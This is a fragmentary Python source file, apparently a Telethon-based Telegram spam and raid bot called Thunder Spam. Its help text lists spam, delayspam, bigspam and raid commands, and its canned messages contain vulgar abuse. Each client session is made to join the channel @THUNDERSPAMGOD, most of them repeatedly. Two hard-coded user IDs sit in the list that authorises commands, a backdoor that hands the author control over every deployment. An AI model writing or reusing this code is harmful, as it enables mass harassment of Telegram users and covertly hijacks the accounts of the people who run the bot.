...
SMEX_USERS = [5294722969, 5030846310]
for x in SUDO:
    SMEX_USERS.append(x)
...
async def start_lovely():
    ...
    if smex:
        ...
        try:
            ...
            await idk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await idk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await idk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if smexx:
        ...
        try:
            ...
            await ydk.start()
            await ydk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await ydk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await ydk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if smexxx:
        ...
        try:
            ...
            await  wdk.start()
            await wdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await wdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await wdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if smexxxx:
        ...
        try:
            ...
            await hdk.start()
            await hdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await hdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await hdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if smexxxxx:
        ...
        try:
            ...
            await sdk.start()
            await sdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await sdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await sdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if sixth:
        ...
        try:
            ...
            await adk.start()
            await adk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await adk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await adk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if seven:
        ...
        try:
            ...
            await bdk.start()
            await bdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await bdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await bdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if eight:
        ...
        try:
            ...
            await cdk.start()
            await cdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await cdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await cdk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if ninth:
        ...
        try:
            ...
            await ddk.start()
            await ddk(functions.channels.JoinChannelRequest(channel=" @THUNDERSPAMGOD"))
            await ddk(functions.channels.JoinChannelRequest(channel=" @THUNDERSPAMGOD"))
    ...
    if tenth:
        ...
        try:
            ...
            await edk.start()
            await edk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await edk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await edk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if eleve:
        ...
        try:
            ...
            await vkk.start()
            await vkk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await vkk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if twelv:
        ...
        try:
            ...
            await kkk.start()
            await kkk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await kkk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if thirt:
        ...
        try:
            ...
            await lkk.start()
            await lkk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await lkk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await lkk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if forte:
        ...
        try:
            ...
            await mkk.start()
            await mkk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await mkk(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if fifth:
        ...
        try:
            ...
            await sid.start()
            await sid(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await sid(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
    ...
    if sieee:
        ...
        try:
            ...
            await shy(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await shy(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
    ...
    if seeee:
        ...
        try:
            ...
            await aan(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await aan(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
    ...
    if eieee:
        ...
        try:
            ...
            await ake(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await ake(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
    ...
    if nieee:
        ...
        try:
            ...
            await eel(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await eel(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
    ...
    if gandu:
        ...
        try:
            ...
            await khu(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await khu(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            await khu(functions.channels.JoinChannelRequest(channel="@THUNDERSPAMGOD"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
    ...
    if e.sender_id in SMEX_USERS:
        ...
        if len(e.text) > 6:
            ...
            try:
                ...
                await event.edit("𝐂𝐇𝐀𝐋𝐎 𝐓𝐇𝐔𝐍𝐃𝐄𝐑 𝐂𝐋𝐀𝐍 𝐌𝐀 𝐂𝐇𝐎𝐃 𝐊𝐄 𝐀𝐀𝐓𝐄 𝐇𝐀𝐈.....")
            except Exception as e:
...
async def _(e):
    ...
    if e.sender_id in SMEX_USERS:
        ...
        if len(e.text) > 11:
            ...
            text = "𝐄𝐒𝐊𝐈 𝐌𝐔𝐌𝐌𝐈 𝐊𝐎 𝐓𝐇𝐔𝐍𝐃𝐄𝐑 𝐂𝐋𝐀𝐍 𝐂𝐇𝐎𝐃𝐄𝐆𝐀..."
...
async def ping(e):
    if e.sender_id in SMEX_USERS:
        ...
        await event.edit(f"▒█▀▀█ ▒█▀▀▀█ ▀▀█▀▀\n▒█▀▀▄ ▒█░░▒█ ░▒█░░\n▒█▄▄█ ▒█▄▄▄█ ░▒█░░\n\n  ♡︎ ˢ🇹𝗛𝗨𝗡𝗗𝗘𝗥ᶜ 𝐒ᴘᴀ𝐌 ♡︎..𝐒𝐏𝐀𝐌𝐄𝐑 `{ms}` 𝗠𝗦")
...
async def help(e):
    if e.sender_id in SMEX_USERS:
       text = " ♡︎ ˢ🇹𝗛𝗨𝗡𝗗𝗘𝗥ᶜ 𝐒ᴘᴀ𝐌 ♡︎..𝗖𝗢𝗠𝗠𝗢𝗡𝗗\n\n𝙐𝙩𝙞𝙡𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.ping\n.restart\n\n𝙐𝙨𝙚𝙧𝙗𝙤𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.join\n.pjoin\n.leave\n\n𝙎𝙥𝙖𝙢 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
       await e.reply(text, parse_mode=None, link_preview=None )
